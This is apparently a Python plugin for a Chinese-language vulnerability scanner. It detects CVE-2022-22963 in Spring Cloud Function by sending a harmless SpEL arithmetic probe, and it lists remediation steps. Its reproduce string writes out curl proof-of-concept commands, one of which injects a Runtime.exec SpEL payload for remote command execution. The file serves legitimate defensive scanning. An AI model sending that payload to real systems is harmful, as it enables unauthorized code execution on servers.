# CVE-2022-22963 Spring Cloud Function 远程代码执行（SpEL 路由注入）
# 漏洞原因：Spring Cloud Function 将 HTTP 头 `spring.cloud.function.routing-expression`
#   的值注入 SpEL Expression 求值，攻击者可执行任意命令（影响 3.1.x / 3.2.x）。
# 本插件仅做存在性验证：POST /functionRouter 带 SpEL 探针头，检测响应特征判定接口可达。
from plugins.base import PluginBase
from core.models import ScanResult, STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN
from lib.colors import ok, no
from lib.http import join_url
from lib.matcher import match_cloud_function_spel

# 漏洞命中签名（与 lab/spring_server.py vuln 模式一致；仅用于对拍，非真实利用输出）
SCF_MARKER = 'spring-cloud-function-rce-confirmed'


class SpringCloudFunctionRcePlugin(PluginBase):
    name = 'CVE-2022-22963 Spring Cloud Function 远程代码执行'
    cve = 'CVE-2022-22963'
    severity = 'high'
    # D12：CVSS v3.1 + 合规映射
    cvss_vector = 'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H'
    compliance = '等保2.0:8.1.3;OWASP:A03:2021'
    category = 'vuln'
    description = 'HTTP 请求头 routing-expression 注入 SpEL 求值，可执行任意命令（Cloud Function 3.x）'
    fix = '升级 Spring Cloud Function 至 3.1.7+ / 3.2.3+；或禁用路由功能'
    fix_detail = (
        '【升级方案】pom.xml 升级 Spring Cloud Function：\n'
        '  3.1.x -> 3.1.7+\n'
        '  3.2.x -> 3.2.3+\n'
        '【配置加固】application.yml 禁用动态路由功能：\n'
        '  spring.cloud.function.routing.enabled: false  # 禁用动态路由\n'
        '【代码修复】自定义 FunctionConfiguration，移除 routing-expression 请求头解析\n'
        '【WAF 规则】拦截请求头 spring.cloud.function.routing-expression\n'
        '【合规】OWASP A03:2021 注入；等保 2.0 8.1.3 安全审计机制'
    )
    reproduce = (
        '# 1. 探测 functionRouter 端点可达性：\n'
        'curl -i -X POST "http://target/functionRouter" -d "test"\n'
        '\n'
        '# 2. SpEL 表达式注入探测（7*7=49）：\n'
        'curl -X POST "http://target/functionRouter" \\\n'
        '  -H "spring.cloud.function.routing-expression: T(java.lang.String).valueOf(7*7)" \\\n'
        '  -d "probe"\n'
        '  # 返回 49 即 SpEL 求值成功\n'
        '\n'
        '# 3. 命令执行 PoC（id 命令回显，请勿对未授权目标使用）：\n'
        'curl -X POST "http://target/functionRouter" \\\n'
        '  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\\"id\\")" \\\n'
        '  -d "probe"\n'
        '\n'
        '# 预期响应：POST 返回 200 + SpEL 求值结果（如 49 或命令回显）即漏洞存在'
    )

    def verify(self, target, session):
        url = join_url(target, '/functionRouter')
        # SpEL 探针头（仅触发签名，不执行真实命令）
        headers = {
            'spring.cloud.function.routing-expression': 'T(java.lang.String).valueOf(7*7)',
        }
        try:
            resp = session.post(url, data='probe', headers=headers)
        except Exception as e:
            print(no('Spring Cloud Function RCE（网络异常）'))
            return ScanResult(kind='vuln', name=self.name, status=STATUS_UNKNOWN,
                              url=url, evidence=str(e))

        text = resp.text or ''
        if SCF_MARKER in text:
            print(ok('存在 CVE-2022-22963 Spring Cloud Function 远程代码执行漏洞'))
            return ScanResult(
                kind='vuln', name=self.name, severity=self.severity,
                status=STATUS_CONFIRMED, url=url,
                evidence=f'响应含 Cloud Function SpEL 特征：{SCF_MARKER}',
                fix=self.fix,
            )
        # 真实漏洞响应：SpEL 求值结果（7*7=49 短数字 / 命令回显）
        if resp.status_code == 200 and match_cloud_function_spel(text):
            print(ok('存在 CVE-2022-22963 Spring Cloud Function 远程代码执行漏洞（真实漏洞响应）'))
            return ScanResult(
                kind='vuln', name=self.name, severity=self.severity,
                status=STATUS_CONFIRMED, url=url,
                evidence='响应含 SpEL 求值结果（短数字 / 命令回显），证实 Cloud Function SpEL 注入可达',
                fix=self.fix,
            )
        print(no('不存在 CVE-2022-22963 Spring Cloud Function 远程代码执行漏洞'))
        return ScanResult(kind='vuln', name=self.name, status=STATUS_SAFE, url=url,
                          evidence='响应未含 Cloud Function RCE 特征（可能未部署或已修复）')
